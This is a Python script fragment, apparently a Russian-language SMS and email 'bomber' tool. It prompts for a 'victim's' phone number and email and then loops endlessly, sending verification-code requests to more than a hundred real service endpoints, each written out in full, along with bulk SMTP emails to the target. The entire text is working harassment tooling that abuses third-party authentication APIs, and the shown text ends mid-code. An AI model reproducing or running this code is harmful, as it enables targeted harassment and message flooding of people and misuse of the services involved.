def sms():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите номер жертвы: (7XXXXXXXXX)')
  phone = input ('>>>')
  phone9 = phone[1:]
  phoneAresBank = "+"+ phone[0]+"("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phone9dostavista =  phone9[:3]+"+"+ phone9[3:6]+"-"+ phone9[6:8]+"-"+ phone9[8:10]
  phoneOstin = "+"+ phone[0]+"+("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phonePizzahut = "+" + phone[0]+" ("+ phone[1:4]+") "+ phone[4:7]+" "+ phone[7:9]+" "+ phone[9:11]
  phoneGorzdrav =  phone[1:4]+") "+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  namechoose2 = ['Йувер', 'Цукенберг', 'Умерведённый', 'Екажорсеч', 'Нобиль', 'Гопарь', 'Шумерга']
  name = random.choice (namechoose2)
  while True:
    try:
        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": phone9}).json()["res"]
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://api.mtstv.ru/v1/users", json={"msisdn": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
    except:
        pass
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        pass
    try:
        requests.post("https://cloud.mail.ru/api/v2/notify/applink", json={"phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email"})
    except:
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" +phone})
    except:
        pass
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
    except:
        pass
    try:
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"email_or_username": phone, "recaptcha_challenge_field":""})
    except:
        pass
    try:
        requests.post("https://vladikavkaz.edostav.ru/site/CheckAuthLogin", data={"phone_or_email":phone}, headers={"Host": "vladikavkaz.edostav.ru", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US, en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "26"})
    except:
        pass
    try:
        requests.post("https://fix-price.ru/ajax/registerphone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0})
    except:
        pass
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" +phone, "action": "confirm_mobile"})
    except:
        pass
    try:
        requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": phone9})
    except:
        pass
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone})
    except:
        pass
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/" +phone, json={"sender": "Tele2"})
    except:
        pass
    try:
        requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={"phoneNumber": phone, "countryCode": "ID", "name": "test", "email": "mail@mail.com", "deviceToken": "*"}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"})
    except:
        pass
    try:
        requests.post("https://belkacar.ru/get-confirmation-code", data={"phone": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://www.rabota.ru/remind", data={"credential": phone})
    except:
        pass
    try:
        requests.post("https://rutube.ru/api/accounts/sendpass/phone", data={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php", data={"name": _name, "phone": phone, "promo": "yellowforma"})
    except:
        pass
    try:
        requests.get("https://www.oyorooms.com/api/pwa/generateotp?phone="+phone9+"&country_code=%2B7&nod=4&locale=en")
    except:
        pass
    try:
        requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://newnext.ru/graphql", json={"operationName": "registration", "variables": {"client": {"firstName": "Иван", "lastName": "Иванов", "phone": phone, "typeKeys": ["Unemployed"]}}, "query": "mutation registration($client: ClientInput!) {""\n  registration(client: $client) {""\n    token\n    __typename\n  }\n}\n"})
    except:
        pass
    try:
        requests.post("https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", json={"client_type": "personal", "email": _email, "mobilephone": phone, "deliveryOption": "sms"})
    except:
        pass
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
    except:
        pass
    try:
        requests.post("https://online.sbis.ru/reg/service/", json={"jsonrpc":"2.0", "protocol":"5", "method":"Пользователь.ЗаявкаНаФизика", "params":{"phone":phone}, "id":"1"})
    except:
        pass
    try:
        requests.post("https://ib.psbank.ru/api/authentication/extendedClientAuthRequest", json={"firstName":"Иван", "middleName":"Иванович", "lastName":"Иванов", "sex":"1", "birthDate":"10.10.2000", "mobilePhone": phone9, "russianFederationResident":"true", "isDSA":"false", "personalDataProcessingAgreement":"true", "bKIRequestAgreement":"null", "promotionAgreement":"true"})
    except:
        pass
    try:
        requests.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
    except:
        pass
    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": phone})
    except:
        pass
    try:
        requests.post("https://www.stoloto.ru/send-mobile-app-link", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers={"App-ID": "cabinet"})
    except:
        pass
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": phone, "type": 2})
    except:
        pass
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.delivery-club.ru/ajax/user_otp", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://alfalife.cc/auth.php", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://app.cloudloyalty.ru/demo/send-code", json={"country": 2, "phone": phone, "roistatVisit": "47637", "experiments": {"new_header_title": "1"}})
    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
    except:
        pass
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.ollis.ru/gql", json={"query": "mutation { phone(number:'%s', locale:ru) { token error { code message } } }"% phone})
    except:
        pass
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode", headers={"token": "."}, data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms", json={"userPhone": "+" + phone}, headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"})
    except:
        pass
    try:
        requests.post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" +phone, "resend": 0})
    except:
        pass
    try:
        requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": "+" +phone})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ru/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +phone})
    except:
        pass
    try:
        requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": phone})
    except:
        pass
    try:
        requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://pizzahut.ru/account/password-reset", data={"reset_by":"phone", "action_id":"pass-recovery", "phone": phone, "_token":"*"})
    except:
        pass
    try:
        requests.post("https://plink.tech/register/", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9})
    except:
        pass
    try:
        requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": phoneGorzdrav})
    except:
        pass
    try:
        requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": phoneGorzdrav})
    except:
        pass
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone})
    except:
        pass
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
    except:
        pass
    try:
        requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29", data={"caller_number": phone})
    except:
        pass
    try:
        requests.post("https://mousam.ru/api/checkphone", data={"phone": phone, "target": "android app v0.0.2"})
    except:
        pass
    try:
        requests.post("https://ggbet.ru/api/auth/register-with-phone", data={"phone": "+" + phone, "login": email, "password": password, "agreement": "on", "oferta": "on"})
    except:
        pass
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": name, "firstName": name, "middleName": name, "mobilePhone": phone, "email": email,"smsCode": ""})
    except:
        pass
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"})
    except:
        pass
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
    except:
        pass
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"})
    except:
        pass
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"})
    except:
        pass
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.etm.ru/cat/runprog.html", data={"mphone": phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"}, data={"loginId": "+" + phone})
    except:
        pass
    try:
        requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone, "g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php", data={"casePar": "authSendsms", "MobilePhone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONALphone]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"})
    except:
        pass
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/", data={"country": "RU", "csrfmiddlewaretoken": "", "phone": phone})
    except:
        pass
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone})
    except:
        pass
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle", json={"url": "/api/client/phone_verification", "method": "POST", "data": {"client_id": 5646981, "phone": phone, "alisa_id": 1}, "headers": {"Client-Id": 5646981, "Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
    except:
        pass
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"})
    except:
        pass
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"})
    except:
        pass
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONALphone]": phone, "code": "", "sendsms": "Выслать код"})
    except:
        pass
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": json.dumps({"login": phone})})
    except:
        pass
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone})
    except:
        pass
    try:
        requests.post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone})
    except:
        pass
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callbackphonenumber", "phone": phone})
    except:
        pass
    try:
        requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/", data={"RECALL": "Y", "BACK_CALLphone": phone})
    except:
        pass
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + phone, "first_name": "-", "utm_data": {}, "via": "call"})
    except:
        pass
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + phone, "first_name": "-", "utm_data": {}, "via": "sms"})
    except:
        pass
    try:
        requests.post("https://b.utair.ru/api/v1/login/", data={"login": "+" + phone})
    except:
        pass
    try:
        requests.get("https://vezitaxi.com/api/employment/getsmscode", params={"phone": "+" + phone, "city": 561, "callback": "jsonp_callback_35979"})
    except:
        pass
    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
    except:
        pass
    try:
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"email_or_username": phone, "recaptcha_challenge_field":""})
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"})
    except:
        pass
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0})
    except:
        pass
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
    except:
        pass
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
    except:
        pass
    try:
        requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
    except:
        pass
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone})
    except:
        pass
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "UA"})
    except:
        pass
    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": phone})
    except:
        pass
    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": phone, "password": _name})
    except:
        pass
    try:
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': phone})                
    except:
        pass
    try:
        requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/', data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": phone})
    except:
        pass
    try:
        requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
        pass
    try:
        requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
                    pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
    except:
        pass
    try:
        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={"phone": phone, "do": "phone"})
    except:
        pass
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
    except:
        pass
    try:
        requests.post('https://mobileplanet.ua/register', data={"klient_name": name,"klientphone": "+" + phone,"klient_email": email})
    except:
        pass
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
    except:
        pass
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post('https://www.moyo.ua/identity/registration', data={"firstname": name,"phone": phone,"email": email})
    except:
        pass
    try:
        requests.post('https://secure.online.ua/ajax/checkphone/', params={"regphone": phone})
    except:
        pass
    try:
        requests.post('https://mamamia.ua/api/auth/login', data={"phone": phone}) 
    except:
        pass
    try:
        requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false})
    except:
        pass
    try:
        requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"phone","nextStep":"auth-otp","__typename":"FlowResponse"}})
    except:
        pass
    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone":phone})
    except:
        pass
    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": phone})
    except:
        pass
    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": phone})
    except:
        pass
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('Спамер завершён! Для выхода в главное меню напишите - "Выход"')
    choose3 = input ('>>>')
    if choose3 == 'Выход':
      exit

def mail():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите адрес почты с которой будеть отправляться сообщения (только почта яндекс или мэйл):')
  print ('ВНИМАНИЕ! К ПОЧТЕ ДОЛЖЕН БЫТЬ ПРИВЯЗАН НОМЕР ТЕЛЕФОНА!')
  L = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите пароль от почты:')
  P = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Если почта яндекс введите - smtp.mail.ru, если мэил smtp.yandex.ru')
  U = input(">>>")
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Почта жертвы')
  To = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Тема письма')
  T = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Текст письма;;')
  M = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Количество писем')
  N = input ('>>>')
  for value in range( int( N ) ):
    msg = MIMEMultipart()
    msg[ 'Subject' ] = T
    msg[ 'From' ] = L
    body = M
    msg.attach( MIMEText( body, 'plain' ) )
    server = root.SMTP_SSL( U, 465 )
    server.login( L, P )
    server.sendmail( L, To, msg.as_string() )
    server.quit()
    value += 1
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Спамер завершён! Для выхода в главное меню напишите - "Выход"')
  choose3 = input ('>>>')
  if choose3 == 'Выход':
    exit

def smsandmail():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите номер жертвы: (7XXXXXXXXX)')
  phone = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите адрес почты с которой будеть отправляться сообщения (только почта яндекс или мэйл):')
  print ('ВНИМАНИЕ! К ПОЧТЕ ДОЛЖЕН БЫТЬ ПРИВЯЗАН НОМЕР ТЕЛЕФОНА!')
  L = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите пароль от почты:')
  P = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Если почта яндекс введите - smtp.mail.ru, если мэил smtp.yandex.ru')
  U = input(">>>")
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Почта жертвы')
  To = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Тема письма')
  T = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Текст письма;;')
  M = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Количество писем')
  N = input ('>>>')
  phone9 = phone[1:]
  phoneAresBank = "+"+ phone[0]+"("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phone9dostavista =  phone9[:3]+"+"+ phone9[3:6]+"-"+ phone9[6:8]+"-"+ phone9[8:10]
  phoneOstin = "+"+ phone[0]+"+("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phonePizzahut = "+" + phone[0]+" ("+ phone[1:4]+") "+ phone[4:7]+" "+ phone[7:9]+" "+ phone[9:11]
  phoneGorzdrav =  phone[1:4]+") "+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  namechoose2 = ['Йувер', 'Цукенберг', 'Умерведённый', 'Екажорсеч', 'Нобиль', 'Гопарь', 'Шумерга']
  name = random.choice (namechoose2)
  while True:
    #Sms
    try:
        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": phone9}).json()["res"]
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://api.mtstv.ru/v1/users", json={"msisdn": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
    except:
        pass
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        pass
    try:
        requests.post("https://cloud.mail.ru/api/v2/notify/applink", json={"phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email"})
    except:
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" +phone})
    except:
        pass
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
    except:
        pass
    try:
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"email_or_username": phone, "recaptcha_challenge_field":""})
    except:
        pass
    try:
        requests.post("https://vladikavkaz.edostav.ru/site/CheckAuthLogin", data={"phone_or_email":phone}, headers={"Host": "vladikavkaz.edostav.ru", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US, en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "26"})
    except:
        pass
    try:
        requests.post("https://fix-price.ru/ajax/registerphone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0})
    except:
        pass
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" +phone, "action": "confirm_mobile"})
    except:
        pass
    try:
        requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": phone9})
    except:
        pass
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone})
    except:
        pass
    try:
